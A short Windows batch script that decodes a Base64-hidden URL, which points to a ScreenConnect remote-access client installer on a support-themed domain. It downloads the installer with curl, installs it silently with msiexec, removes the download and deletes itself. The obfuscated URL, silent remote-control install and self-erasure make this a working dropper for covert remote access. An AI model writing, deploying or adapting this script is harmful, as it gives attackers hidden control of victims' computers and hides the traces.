@echo off
setlocal enabledelayedexpansion

REM ==============================
REM Configuration
REM ==============================
:: This is your Base64 encoded URL
set "ENC_URL=aHR0cHM6Ly9zZXJ2ZXIuY2FyZTFzdXBwb3J0LmNsb3VkL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0JmM9JmM9JmM9dXNlckEmYz0mYz0mYz0mYz0mYz0="
set MSI_NAME=ClientSetup.msi
set DOWNLOAD_DIR=%TEMP%\MSIInstall
set MSI_PATH=%DOWNLOAD_DIR%\%MSI_NAME%
set LOG_FILE=%DOWNLOAD_DIR%\install.log

REM Decode URL using PowerShell
for /f "delims=" %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ENC_URL%'))"') do set "MSI_URL=%%i"

if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"

echo Downloading...
curl -L "%MSI_URL%" -o "%MSI_PATH%" --fail

echo Installing...
msiexec /i "%MSI_PATH%" /qn /norestart /log "%LOG_FILE%"

REM ==============================
REM Cleanup & Self-Destruct
REM ==============================
echo Cleaning up...
del /f /q "%MSI_PATH%"
rmdir /s /q "%DOWNLOAD_DIR%"

REM This line deletes the .bat file itself
(goto) 2>nul & del "%~f0"
